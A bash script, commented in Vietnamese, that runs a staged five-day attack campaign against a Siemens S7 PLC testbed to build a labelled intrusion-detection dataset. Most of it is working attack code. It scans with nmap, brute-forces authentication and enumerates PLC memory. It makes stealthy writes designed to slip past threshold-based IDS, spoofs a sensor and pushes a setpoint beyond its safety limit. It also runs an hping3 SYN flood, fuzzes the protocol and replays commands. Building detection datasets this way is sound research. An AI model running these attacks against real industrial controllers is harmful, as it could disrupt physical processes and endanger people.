#!/bin/bash
# =================================================================
# run_attacker.sh — Kịch bản tấn công thực tế (chuẩn nghiên cứu)
# =================================================================
# Căn cứ:
#   - SWaT Dataset (iTrust, SUTD 2016): benign ≥87%, attack recovery bắt buộc
#   - BATADAL (Taormina 2018): multi-stage stealthy, không đột ngột
#   - Medical Waste Incinerator S7-1500 (2023): MITM, Replay, Fuzz, Flood
#   - MITRE ATT&CK for ICS: T0846 (Discovery) → T0836 (Manipulate) → T0814 (DoS)
#   - Stuxnet: slow-rate scan (T1 paranoid), stealthy write trong ngưỡng ±5%
#   - Industroyer: burst flood ngắn lặp lại thay vì 1 burst dài
#
# Chạy trên máy ATTACKER (Kali Linux):
#   Ngày 1: bash run_attacker.sh 1 192.168.1.10 192.168.1.0/24
#   Ngày 2: bash run_attacker.sh 2 192.168.1.10 192.168.1.0/24
#   Ngày 3: bash run_attacker.sh 3 192.168.1.10 192.168.1.0/24
#   Ngày 4: bash run_attacker.sh 4 192.168.1.10 192.168.1.0/24
#   Ngày 5: bash run_attacker.sh 5 192.168.1.10 192.168.1.0/24
#
# Yêu cầu:
#   - s7pwn đã cài: pip install -e .
#   - Máy Logger chạy: python label_webhook_server.py --port 9000 --output /data/labels/dayN_timeline.csv
#   - NTP đồng bộ giữa tất cả máy: timedatectl set-ntp true
#   - Kali packages: nmap, arpspoof (dsniff), hping3, tshark
# =================================================================

DAY=${1:?"Thiếu tham số: bash run_attacker.sh <DAY 1-5>"}
TARGET=${2:-"192.168.1.10"}
SUBNET=${3:-"192.168.1.0/24"}
IFACE=${IFACE:-"eth0"}
LOGGER_URL=${LOGGER_URL:-"http://192.168.1.200:9000/label"}

# Lấy gateway mặc định (dùng cho ARP Poison MITM)
GATEWAY=$(ip route | grep default | awk '{print $3}' 2>/dev/null || echo "192.168.1.1")

S7PWN="python -m s7pwn --target $TARGET"
PCAP_DIR="captures/day${DAY}"
mkdir -p "$PCAP_DIR" logs tmp

# =================================================================
# TỈ LỆ THU THẬP (Chuẩn SWaT/BATADAL)
# =================================================================
# Tổng: 5 ngày × 4 giờ = 20 giờ
# Benign: ≥87% (SWaT chuẩn) — attack rất hiếm trong thực tế ICS
#
# Tỉ lệ Benign theo ngày:
#   Ngày 1: 100% Benign (baseline học)
#   Ngày 2: 92% Benign / 8% Attack (trinh sát thụ động - Stuxnet style)
#   Ngày 3: 88% Benign / 12% Attack (trinh sát tích cực + MITM)
#   Ngày 4: 85% Benign / 15% Attack (toàn vẹn dữ liệu - BATADAL style)
#   Ngày 5: 82% Benign / 18% Attack (tính sẵn sàng - burst ngắn lặp lại)
# =================================================================

# Duration constants (giây) - dựa trên Medical Waste Incinerator dataset
# Trinh sát chậm: 45-60 phút (Stuxnet dwell weeks, đây là testbed rút ngắn)
SLOW_SCAN_DUR=2700       # 45 phút  — nmap -T1 paranoid (Stuxnet-style)
DCP_PASSIVE_DUR=2700     # 45 phút  — Profinet DCP passive identification
SLOW_ENUM_DUR=2700       # 45 phút  — enum tag 1 req/2s (không trigger IDS ngưỡng)
# Trinh sát tích cực
FAST_SCAN_DUR=1800       # 30 phút  — nmap -T4 + banner grab
AUTH_BRUTE_DUR=1800      # 30 phút  — 1 attempt/3s (avoid lockout)
FAST_ENUM_DUR=2700       # 45 phút  — enum tag 0.05s interval (burst)
MITM_DUR=1800            # 30 phút  — ARP poison passive eavesdrop
# Toàn vẹn (Integrity attacks)
STEALTHY_WRITE_DUR=1800  # 30 phút  — ghi trong ngưỡng ±5% (Stuxnet Phase 1)
RWRITE_DUR=1200          # 20 phút  — ghi liên tục 0.1s (burst)
SPOOF_DUR=1800           # 30 phút  — giả mạo sensor cố định
SETPOINT_DUR=1200        # 20 phút  — vượt ngưỡng an toàn
# Tính sẵn sàng (Availability) - burst ngắn lặp lại (Industroyer style)
FLOOD_BURST_DUR=300      # 5 phút/burst — 3 burst = 15 phút tổng
FLOOD_BURST_GAP=600      # 10 phút nghỉ giữa mỗi burst
SYN_FLOOD_DUR=180        # 3 phút  — hping3 burst ngắn (thực tế hơn)
FUZZ_DUR=1800            # 30 phút — malformed S7 PDU (Medical Incinerator)
REPLAY_DUR=1200          # 20 phút — replay lệnh sai ngữ cảnh
# Cooldown
COOLDOWN_S=1200          # 20 phút cooldown ngắn
COOLDOWN_L=1800          # 30 phút cooldown dài

echo "================================================================"
echo "  ATTACKER SCRIPT — NGÀY $DAY (Chuẩn SWaT/BATADAL/Incinerator)"
echo "  Target  : $TARGET  |  Subnet: $SUBNET"
echo "  Gateway : $GATEWAY  |  Iface: $IFACE"
echo "  Logger  : $LOGGER_URL"
echo "================================================================"

# ─── Kiểm tra tiên quyết ──────────────────────────────────────
if ! python -c "import s7pwn" 2>/dev/null; then
    echo "[ERROR] s7pwn chưa cài! Chạy: pip install -e ."
    exit 1
fi

# ─── Hàm gửi label về Logger (timestamp ms chính xác) ─────────
send_label() {
    local label=$1 action=$2 note=${3:-""}
    local ts_ms
    ts_ms=$(python3 -c "import time; print(int(time.time()*1000))")
    curl -s -X POST "$LOGGER_URL" \
        -H "Content-Type: application/json" \
        -d "{\"timestamp\": $ts_ms, \"label\": \"$label\", \"action\": \"$action\", \"day\": $DAY, \"note\": \"$note\"}" \
        >/dev/null 2>&1 || true
    echo "[$(date +%H:%M:%S)] >>> LABEL: $label $action  ${note:+(note: $note)}"
}

cooldown() {
    local seconds=$1 reason=${2:-"cooldown"}
    send_label "BENIGN" "START" "$reason"
    echo "[$(date +%H:%M:%S)] ... Cooldown $seconds giây ($reason)"
    sleep "$seconds"
    send_label "BENIGN" "END" "$reason"
}

restore_plc() {
    echo "[$(date +%H:%M:%S)] >>> Khôi phục trạng thái PLC..."
    # Reset Q0 (output), M0/M1 (control merkers), M10 (setpoint về giá trị an toàn=50)
    $S7PWN write "M0=0:byte" "M1=0:byte" "M10=50:byte" "Q0=1:byte" >/dev/null 2>&1 || true
    sleep 2  # đợi PLC apply lệnh write
}

# ================================================================
# NGÀY 1 — Benign Baseline (Toàn bộ, Attacker idle)
# Căn cứ: SWaT thu 7 ngày baseline trước khi inject attack (paper gốc)
# Mục tiêu: AI học đường cơ sở process bình thường
# Benign: 100% | Attack: 0%
# ================================================================
if [ "$DAY" = "1" ]; then
    echo "Ngày 1: Baseline — Attacker IDLE hoàn toàn. 100% BENIGN."
    echo "Mục đích: AI học baseline pattern của hệ thống Traffic Light PLC."
    send_label "BENIGN" "START" "day1_full_baseline"
    sleep 14400  # 4 tiếng
    send_label "BENIGN" "END" "day1_full_baseline"
    echo ""
    echo "Thống kê: Benign=100% | Attack=0%"
    exit 0
fi

# ================================================================
# NGÀY 2 — PASSIVE RECONNAISSANCE (Trinh sát thụ động)
# Căn cứ: Stuxnet dwell 14+ tháng, nmap -T1 Paranoid để tránh IDS
#          MITRE T0840 (Network Sniffing), T0846 (Remote System Discovery)
# Đặc điểm: Attacker KHÔNG gây tác động đến process PLC
#            → Khó phát hiện nhất vì traffic gần như không khác BENIGN
# Benign: 92% | Attack: 8% (~19 phút attack / 4 tiếng)
# ================================================================
if [ "$DAY" = "2" ]; then
    echo "=== NGÀY 2: PASSIVE RECON (Slow Scan → DCP Identify → Slow Enum) ==="
    echo "Căn cứ: Stuxnet nmap -T1 Paranoid, MITRE T0846/T0840"
    cooldown "$COOLDOWN_L" "warmup_day2"

    # ── PHA 1: SLOW PORT SCAN (nmap Paranoid -T1) ──────────────
    # Căn cứ: Stuxnet và TRITON đều dùng rate cực thấp để tránh IDS
    # nmap -T1: 15s scan-delay giữa mỗi probe → gần như không khác benign
    echo "[*] PHA 1: SLOW_SCAN (nmap -T1 Paranoid — 45 phút)"
    send_label "SLOW_SCAN" "START" "nmap_T1_paranoid_stuxnet_style"
    (
        while true; do
            # -T1: Paranoid (15s delay/probe), -sV: version detection, --scan-delay 15s
            nmap -p 102,502,20000,443,80 -sV -T1 --scan-delay 15s \
                 --max-retries 1 "$SUBNET" \
                 -oX "tmp/scan_day2_slow.xml" >/dev/null 2>&1 || true
            sleep 30  # đợi 30s rồi lặp lại
        done
    ) &
    NP=$!
    sleep "$SLOW_SCAN_DUR"
    kill "$NP" 2>/dev/null; wait "$NP" 2>/dev/null || true
    send_label "SLOW_SCAN" "END" "nmap_T1_paranoid"
    cooldown "$COOLDOWN_S" "after_slow_scan"

    # ── PHA 2: PROFINET DCP PASSIVE IDENTIFY ───────────────────
    # Căn cứ: Medical Waste Incinerator dataset — DCP Identify Request
    # MITRE T0846: broadcast DCP Identify để enumerate thiết bị Siemens
    # Gửi DCP request mỗi 10s (giống thiết bị Siemens Engineering Station)
    echo "[*] PHA 2: DCP_PASSIVE_IDENTIFY (Profinet Layer 2 — 45 phút)"
    send_label "DCP_PASSIVE_IDENTIFY" "START" "profinet_dcp_identify_T0846"
    python3 - <<'PYEOF' &
import time, sys
try:
    from scapy.all import Ether, sendp
    # DCP Identify Request – broadcast (chuẩn IEC 61158)
    dcp_identify = (
        Ether(dst="ff:ff:ff:ff:ff:ff", type=0x8892) /
        b"\xfe\xfe\x05\x00\x00\x00\x00\x00\x00\x04\x00\x00"
    )
    print("[DCP] Bắt đầu DCP Identify broadcast mỗi 10s...")
    count = 0
    while True:
        sendp(dcp_identify, iface=sys.argv[1] if len(sys.argv)>1 else "eth0", verbose=False)
        count += 1
        print(f"[DCP] Sent #{count}", flush=True)
        time.sleep(10)
except ImportError:
    # Fallback nếu không có scapy: dùng nmap với script Profinet
    import subprocess
    while True:
        subprocess.run(["nmap", "--script", "profinet-identify", "-p", "102", sys.argv[1] if len(sys.argv)>1 else "192.168.1.10"],
                      capture_output=True)
        time.sleep(10)
except Exception as e:
    print(f"[DCP] Error: {e}")
PYEOF
    DCPP="$!"
    sleep "$DCP_PASSIVE_DUR"
    kill "$DCPP" 2>/dev/null; wait "$DCPP" 2>/dev/null || true
    send_label "DCP_PASSIVE_IDENTIFY" "END"
    cooldown "$COOLDOWN_S" "after_dcp_identify"

    # ── PHA 3: ENUM TAGS SLOW (1 req / 2 giây) ─────────────────
    # Căn cứ: BATADAL — trinh sát chậm không trigger threshold-based IDS
    # MITRE T0861: enumerate PLC memory areas (M, I, Q) với tốc độ thấp
    echo "[*] PHA 3: ENUM_TAGS_SLOW (1 req/2s — 45 phút)"
    send_label "ENUM_TAGS_SLOW" "START" "slow_rate_1req_per_2s_BATADAL_style"
    $S7PWN enum_tags --area M --start 0 --end 99 --type byte --interval 2.0 &
    EP=$!
    sleep "$SLOW_ENUM_DUR"
    kill "$EP" 2>/dev/null; wait "$EP" 2>/dev/null || true
    send_label "ENUM_TAGS_SLOW" "END"
    cooldown "$COOLDOWN_S" "after_slow_enum"

    echo ""
    echo "Thống kê Ngày 2: Benign≈92% | Attack≈8%"
    echo "  SLOW_SCAN: ${SLOW_SCAN_DUR}s | DCP_IDENTIFY: ${DCP_PASSIVE_DUR}s | ENUM_SLOW: ${SLOW_ENUM_DUR}s"
fi

# ================================================================
# NGÀY 3 — ACTIVE RECONNAISSANCE + CREDENTIAL ATTACK + MITM
# Căn cứ: Medical Waste Incinerator S7-1500 (2023) — MITM là 1/8 attack chính
#          MITRE T0830 (Man in the Middle), T0809 (Exploit S7 Auth)
#          TRITON: dành nhiều tuần nghiên cứu giao thức trước khi tấn công
# Đặc điểm: Tăng tốc độ scan, thêm MITM (ARP poison) để nghe lén
# Benign: 88% | Attack: 12% (~29 phút attack / 4 tiếng)
# ================================================================
if [ "$DAY" = "3" ]; then
    echo "=== NGÀY 3: ACTIVE RECON + MITM (Fast Scan → Auth → FastEnum → MITM) ==="
    echo "Căn cứ: Medical Waste Incinerator dataset, MITRE T0830/T0809"
    cooldown "$COOLDOWN_S" "warmup_day3"

    # ── PHA 1: FAST SCAN (nmap -T4 + banner grab) ──────────────
    # Chuyển sang -T4 aggressive — attacker đã quen môi trường (sau ngày 2)
    echo "[*] PHA 1: FAST_SCAN (nmap -T4 + banner — 30 phút)"
    send_label "FAST_SCAN" "START" "nmap_T4_aggressive_banner_grab"
    (
        while true; do
            nmap -p 102,502,20000,443,80,22,21,3389 -sV -T4 \
                 --script=banner,s7-info,modbus-discover \
                 "$SUBNET" -oX "tmp/scan_day3_fast.xml" >/dev/null 2>&1 || true
            sleep 20
        done
    ) &
    FSP=$!
    sleep "$FAST_SCAN_DUR"
    kill "$FSP" 2>/dev/null; wait "$FSP" 2>/dev/null || true
    send_label "FAST_SCAN" "END"
    cooldown "$COOLDOWN_S" "after_fast_scan"

    # ── PHA 2: AUTH BRUTE FORCE (1 attempt / 3s) ───────────────
    # Căn cứ: S7 không có native auth trong S7-300, nhưng S7-1200/1500 có
    #          Rate 1/3s = 20 attempt/phút → không trigger lockout (thường >5/min)
    # MITRE T0809: Exploit Public-Facing Application (S7 auth bypass)
    echo "[*] PHA 2: AUTH_BRUTE (1 attempt/3s — 30 phút)"
    send_label "AUTH_BRUTE" "START" "s7_auth_brute_1attempt_per_3s_T0809"
    python3 - <<PYEOF &
import sys, time
sys.path.insert(0, '.')
try:
    from s7pwn.commands.auth import auth
    print("[AUTH_BRUTE] Bắt đầu brute force S7 auth (1 attempt/3s)")
    count = 0
    while True:
        try:
            auth(['bruteforce', '--delay', '3'])
        except Exception as e:
            pass
        count += 1
        print(f"[AUTH_BRUTE] Attempt #{count}", flush=True)
        time.sleep(3)
except Exception as e:
    # Fallback: thử connect với các slot khác nhau (enum slots)
    import snap7
    slots = [0, 1, 2, 3, 4]
    racks = [0, 1, 2]
    while True:
        for rack in racks:
            for slot in slots:
                try:
                    c = snap7.client.Client()
                    c.connect('$TARGET', rack, slot)
                    c.disconnect()
                    print(f"[AUTH_BRUTE] Connected rack={rack} slot={slot}!", flush=True)
                except:
                    pass
        time.sleep(3)
PYEOF
    AP=$!
    sleep "$AUTH_BRUTE_DUR"
    kill "$AP" 2>/dev/null; wait "$AP" 2>/dev/null || true
    send_label "AUTH_BRUTE" "END"
    cooldown "$COOLDOWN_S" "after_auth_brute"

    # ── PHA 3: ENUM TAGS FAST (0.05s interval, burst) ──────────
    # Sau khi đã có thông tin từ slow enum (ngày 2), giờ enum nhanh
    echo "[*] PHA 3: ENUM_TAGS_FAST (0.05s interval — 45 phút)"
    send_label "ENUM_TAGS_FAST" "START" "fast_enum_after_recon_T0861"
    $S7PWN enum_tags --area M --start 0 --end 99 --type byte --interval 0.05 &
    EFP=$!
    # Enum thêm Data Block
    $S7PWN enum_tags --area DB --db-num 1 --start 0 --end 49 --type word --interval 0.1 &
    EDBP=$!
    sleep "$FAST_ENUM_DUR"
    kill "$EFP" "$EDBP" 2>/dev/null; wait "$EFP" "$EDBP" 2>/dev/null || true
    send_label "ENUM_TAGS_FAST" "END"
    cooldown "$COOLDOWN_S" "after_fast_enum"

    # ── PHA 4: BỎ QUA — MITM/ARP POISON ────────────────────────
    # LÝ DO BỎ: Lab chỉ có 2 máy (Attacker + Controller+Logger cùng subnet).
    # ARP Poison 2 chiều sẽ làm gián đoạn kết nối của máy Controller+Logger
    # với PLC → mất log_tags + mất tshark capture → hỏng dataset.
    # Thay bằng cooldown benign dài hơn → tăng tỉ lệ BENIGN ngày 3 lên ~90%.
    echo "[SKIP] PHA 4: MITM_ARP_POISON — bỏ qua (lab 2 máy)"
    echo "       Thay bằng cooldown benign bổ sung 30 phút..."
    cooldown "$MITM_DUR" "replaced_mitm_with_benign_for_2machine_lab"

    echo ""
    echo "Thống kê Ngày 3 (2 máy): Benign≈90% | Attack≈10%"
    echo "  Attack types: FAST_SCAN, AUTH_BRUTE, ENUM_TAGS_FAST"
fi

# ================================================================
# NGÀY 4 — INTEGRITY ATTACK (Leo thang, BATADAL multi-stage)
# Căn cứ: BATADAL scenario 2–6: ghi sai dần dần, không đột ngột
#          Stuxnet Phase 1: stealthy write trong ngưỡng ±5% (khó detect nhất)
#          MITRE T0836 (Modify Parameter), T0856 (Spoof Reporting Message)
# Đặc điểm: Tăng dần mức độ từ stealthy (±5%) → burst → spoof → vượt ngưỡng
# Benign: 85% | Attack: 15% (~36 phút attack / 4 tiếng)
# ================================================================
if [ "$DAY" = "4" ]; then
    echo "=== NGÀY 4: INTEGRITY ATTACKS (Stealthy→RWrite→Spoof→Setpoint) ==="
    echo "Căn cứ: Stuxnet Phase 1 (±5%), BATADAL multi-stage, MITRE T0836/T0856"
    cooldown "$COOLDOWN_S" "warmup_day4"

    # ── PHA 1: STEALTHY WRITE (trong ngưỡng ±5%) ───────────────
    # Căn cứ: Stuxnet Phase 1 — ghi fake sensor trong ngưỡng an toàn
    #          BATADAL: ghi sai giá trị không vượt threshold → qua IDS đơn giản
    # Ghi M10 dao động ±5 quanh baseline=50, thay đổi mỗi 25-35s
    # Threshold-based IDS sẽ KHÔNG phát hiện (50±5 vẫn "normal")
    # Anomaly-based IDS (AI) CÓ THỂ phát hiện qua pattern drift
    echo "[*] PHA 1: STEALTHY_WRITE (±5% drift, 30 phút — Stuxnet Phase 1)"
    send_label "STEALTHY_WRITE" "START" "within_threshold_±5pct_stuxnet_phase1"
    python3 - <<'PYEOF' &
import snap7, time, random, sys
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.10"
BASELINE = 50
DRIFT_MAX = 5  # ±5% — không vượt ngưỡng cảnh báo thông thường

print(f"[STEALTHY_WRITE] Target: {TARGET}, baseline={BASELINE}, drift=±{DRIFT_MAX}")
print("[STEALTHY_WRITE] Thay đổi mỗi 25-35s, không trigger threshold-based IDS")

c = snap7.client.Client()
change_count = 0
while True:
    try:
        if not c.get_connected():
            c.connect(TARGET, 0, 1)

        # Ghi giá trị drift nhỏ
        delta = random.randint(-DRIFT_MAX, DRIFT_MAX)
        value = BASELINE + delta
        value = max(0, min(255, value))  # clamp

        data = bytearray([value])
        c.write_area(Areas.MK, 0, 10, data)
        change_count += 1
        print(f"[STEALTHY_WRITE] #{change_count}: M10={value} (drift={delta:+d})", flush=True)
    except Exception as e:
        print(f"[STEALTHY_WRITE] Reconnect... {e}")
        try: c.disconnect()
        except: pass
        time.sleep(5)
        continue

    # Đợi ngẫu nhiên 25-35s trước khi thay đổi tiếp (giống benign setpoint change)
    wait_time = random.uniform(25, 35)
    time.sleep(wait_time)
PYEOF
    STP=$!
    sleep "$STEALTHY_WRITE_DUR"
    kill "$STP" 2>/dev/null; wait "$STP" 2>/dev/null || true
    restore_plc
    send_label "STEALTHY_WRITE" "END"
    cooldown "$COOLDOWN_S" "recovery_after_stealthy"

    # ── PHA 2: RWRITE BURST (ghi liên tục 0.1s) ─────────────────
    # Sau khi "thăm dò" ở Phase 1, attacker tăng tốc độ tấn công
    # Ghi M0, M1, Q0 liên tục → process PLC bị can thiệp rõ ràng
    echo "[*] PHA 2: RWRITE_BURST (0.1s interval — 20 phút)"
    send_label "RWRITE_BURST" "START" "continuous_write_0.1s_T0836"
    $S7PWN rwrite "M0=255:byte" "M1=128:byte" "Q0=36:byte" --interval 0.1 &
    RP=$!
    sleep "$RWRITE_DUR"
    kill "$RP" 2>/dev/null; wait "$RP" 2>/dev/null || true
    restore_plc
    send_label "RWRITE_BURST" "END"
    cooldown "$COOLDOWN_S" "recovery_after_rwrite"

    # ── PHA 3: SENSOR SPOOF (giả mạo cảm biến cố định) ──────────
    # Căn cứ: BATADAL scenario 4 — fix sensor value để che giấu tình trạng thực
    #          Stuxnet: gửi fake centrifuge speed readings tới operators
    # MITRE T0856: Spoof Reporting Message
    # Ghi M10=99.9 (real) cố định → HMI thấy "bình thường" dù thực tế đã sai
    echo "[*] PHA 3: SENSOR_SPOOF (constant 99.9 — 30 phút)"
    send_label "SENSOR_SPOOF" "START" "spoof_M10_fixed_99.9_T0856_BATADAL_style"
    $S7PWN spoof "M10=99.9:real" --mode constant --interval 0.5 &
    SP=$!
    sleep "$SPOOF_DUR"
    kill "$SP" 2>/dev/null; wait "$SP" 2>/dev/null || true
    restore_plc
    send_label "SENSOR_SPOOF" "END"
    cooldown "$COOLDOWN_S" "recovery_after_spoof"

    # ── PHA 4: SETPOINT ATTACK (vượt ngưỡng an toàn) ─────────────
    # Ghi M10=200 (vượt MAX_SAFE=80) → trigger Safety Alarm trong PLC
    # Trong thực tế: TRITON nhắm Safety Instrumented System
    # Ở đây: simulate bằng cách vượt setpoint limit
    echo "[*] PHA 4: SETPOINT_ATTACK (M10=200 > MAX_SAFE=80 — 20 phút)"
    send_label "SETPOINT_ATTACK" "START" "exceed_safety_limit_M10=200_T0836"
    $S7PWN rwrite "M10=200:byte" --interval 0.5 &
    SETP=$!
    sleep "$SETPOINT_DUR"
    kill "$SETP" 2>/dev/null; wait "$SETP" 2>/dev/null || true
    restore_plc
    send_label "SETPOINT_ATTACK" "END"
    cooldown "$COOLDOWN_L" "recovery_after_setpoint"

    echo ""
    echo "Thống kê Ngày 4: Benign≈85% | Attack≈15%"
fi

# ================================================================
# NGÀY 5 — AVAILABILITY + REPLAY + DESTRUCTIVE
# Căn cứ: Medical Waste Incinerator — Command Flooding + SYN Flood là 2/8 attack
#          Industroyer: burst ngắn lặp lại (3 lần mất điện trong 1 giờ)
#          Medical Incinerator: Fuzzing 30 phút, Replay là attack riêng biệt
# Flood pattern: BURST NGẮN LẶP LẠI (Industroyer-style) thay vì 1 burst dài
# Benign: 82% | Attack: 18% (~43 phút attack / 4 tiếng)
# ================================================================
if [ "$DAY" = "5" ]; then
    echo "=== NGÀY 5: AVAILABILITY + REPLAY (Flood Burst×3 → SYN → Fuzz → Replay) ==="
    echo "Căn cứ: Industroyer burst pattern, Medical Incinerator, MITRE T0814/T0843/T0819"

    # Capture phiên hợp lệ cho Replay (nếu chưa có)
    REPLAY_FILE="tmp/legit_session_day5.s7replay"
    if [ ! -f "$REPLAY_FILE" ]; then
        echo "[Prep] Capture 30s phiên hợp lệ cho replay attack..."
        send_label "BENIGN" "START" "capture_replay_source"
        $S7PWN replay capture --output "$REPLAY_FILE" --duration 30 || true
        send_label "BENIGN" "END" "capture_replay_source"
    fi

    cooldown "$COOLDOWN_L" "warmup_day5"

    # ── PHA 1: S7 FLOOD — 3 BURST NGẮN LẶP LẠI (Industroyer style) ──
    # Căn cứ: Industroyer gây mất điện 3 lần trong 1 giờ (không phải 1 lần dài)
    #          burst ngắn lặp lại = realistic hơn, balance tỉ lệ window tốt hơn
    # MITRE T0814: Denial of Service
    echo "[*] PHA 1: S7_FLOOD × 3 BURSTS (5 phút/burst, cách nhau 10 phút — Industroyer style)"
    for burst_num in 1 2 3; do
        echo "[*] S7_FLOOD Burst #${burst_num}/3 (${FLOOD_BURST_DUR}s)"
        send_label "S7_FLOOD" "START" "burst_${burst_num}_of_3_industroyer_style"
        # Low rate burst: 100 connections
        $S7PWN flood 100 "$FLOOD_BURST_DUR" 0.05 &
        FP=$!
        sleep "$FLOOD_BURST_DUR"
        kill "$FP" 2>/dev/null; wait "$FP" 2>/dev/null || true
        restore_plc
        send_label "S7_FLOOD" "END" "burst_${burst_num}_of_3"

        # Cooldown ngắn giữa burst (10 phút) — giống Industroyer interval
        if [ "$burst_num" -lt 3 ]; then
            cooldown "$FLOOD_BURST_GAP" "between_flood_burst_${burst_num}"
        fi
    done
    cooldown "$COOLDOWN_S" "after_flood_series"

    # ── PHA 2: TCP SYN FLOOD PORT 102 (burst ngắn 3 phút) ────────
    # Căn cứ: Medical Waste Incinerator — SYN Flooding là 1/8 attack
    # NGẮN (3 phút) vì SYN flood tạo hàng triệu packet — cân bằng dataset
    echo "[*] PHA 2: SYN_FLOOD port 102 (3 phút burst — hping3)"
    send_label "SYN_FLOOD" "START" "hping3_port102_3min_burst_T0814"
    if command -v hping3 &>/dev/null; then
        hping3 -S --flood -p 102 "$TARGET" >/dev/null 2>&1 &
        SFP=$!
    else
        echo "[WARN] hping3 không có. Cài: apt install hping3"
        # Fallback: s7pwn flood high rate
        $S7PWN flood 500 "$SYN_FLOOD_DUR" 0.001 &
        SFP=$!
    fi
    sleep "$SYN_FLOOD_DUR"
    kill "$SFP" 2>/dev/null; wait "$SFP" 2>/dev/null || true
    restore_plc
    send_label "SYN_FLOOD" "END"
    cooldown "$COOLDOWN_L" "recovery_after_syn_flood"

    # ── PHA 3: PROTOCOL FUZZING (malformed S7 PDU) ───────────────
    # Căn cứ: Medical Waste Incinerator — Packet Fuzzing là 1/8 attack chính
    # MITRE T0819: Exploit Remote Services (malformed PDU)
    # Gửi malformed S7 PDU để test PLC error handling
    echo "[*] PHA 3: PROTOCOL_FUZZ (malformed S7 PDU — 30 phút)"
    send_label "PROTOCOL_FUZZ" "START" "malformed_s7_pdu_T0819_incinerator_style"
    $S7PWN fuzz --mode full --count 99999 \
        --output "logs/fuzz_day5_$(date +%H%M%S).jsonl" >/dev/null 2>&1 &
    FZP=$!
    sleep "$FUZZ_DUR"
    kill "$FZP" 2>/dev/null; wait "$FZP" 2>/dev/null || true
    restore_plc
    send_label "PROTOCOL_FUZZ" "END"
    cooldown "$COOLDOWN_S" "recovery_after_fuzz"

    # ── PHA 4: COMMAND REPLAY (sai ngữ cảnh) ─────────────────────
    # Căn cứ: Medical Waste Incinerator — Replay là 1/8 attack chính
    # MITRE T0843: Replay Attack
    # Phát lại phiên hợp lệ đã capture nhưng trong ngữ cảnh sai
    # (VD: phát lại lệnh STOP khi sensor chưa kích hoạt điều kiện dừng)
    echo "[*] PHA 4: COMMAND_REPLAY (20 phút — replay sai ngữ cảnh)"
    send_label "COMMAND_REPLAY" "START" "replay_legitimate_session_wrong_context_T0843"
    if [ -f "$REPLAY_FILE" ]; then
        $S7PWN replay run "$REPLAY_FILE" --loop &
        RPP=$!
        sleep "$REPLAY_DUR"
        kill "$RPP" 2>/dev/null; wait "$RPP" 2>/dev/null || true
        restore_plc
    else
        echo "[SKIP] Không có replay file ($REPLAY_FILE). Thay bằng rwrite..."
        # Fallback replay: gửi lặp lại lệnh STOP bit
        $S7PWN rwrite "M2=4:byte" --interval 0.5 &
        FBP=$!
        sleep "$REPLAY_DUR"
        kill "$FBP" 2>/dev/null; wait "$FBP" 2>/dev/null || true
        restore_plc
    fi
    send_label "COMMAND_REPLAY" "END"
    cooldown "$COOLDOWN_L" "final_recovery_day5"

    echo ""
    echo "Thống kê Ngày 5: Benign≈82% | Attack≈18%"
fi

# ─────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "  HOÀN TẤT KỊCH BẢN NGÀY $DAY"
echo "  $(date)"
echo "================================================================"
echo ""
echo "  THỐNG KÊ TỈ LỆ DỰ KIẾN (window 5s):"
case $DAY in
    1) echo "  Benign: 100% (baseline học)" ;;
    2) echo "  Benign: ~92%  | Attack: ~8%  (Slow Recon — T0846/T0840)"
       echo "  Attack types: SLOW_SCAN, DCP_PASSIVE_IDENTIFY, ENUM_TAGS_SLOW" ;;
    3) echo "  Benign: ~90%  | Attack: ~10% (Active Recon — T0846/T0809)"
       echo "  Attack types: FAST_SCAN, AUTH_BRUTE, ENUM_TAGS_FAST"
       echo "  (MITM bỏ qua — lab 2 máy)" ;;
    4) echo "  Benign: ~85%  | Attack: ~15% (Integrity — T0836/T0856)"
       echo "  Attack types: STEALTHY_WRITE, RWRITE_BURST, SENSOR_SPOOF, SETPOINT_ATTACK" ;;
    5) echo "  Benign: ~82%  | Attack: ~18% (Availability — T0814/T0819/T0843)"
       echo "  Attack types: S7_FLOOD(×3), SYN_FLOOD, PROTOCOL_FUZZ, COMMAND_REPLAY" ;;
esac
echo ""
echo "  Nhãn tổng (15 loại):"
echo "  BENIGN | SLOW_SCAN | DCP_PASSIVE_IDENTIFY | ENUM_TAGS_SLOW"
echo "  FAST_SCAN | AUTH_BRUTE | ENUM_TAGS_FAST | MITM_ARP_POISON"
echo "  STEALTHY_WRITE | RWRITE_BURST | SENSOR_SPOOF | SETPOINT_ATTACK"
echo "  S7_FLOOD | SYN_FLOOD | PROTOCOL_FUZZ | COMMAND_REPLAY"
echo "================================================================"
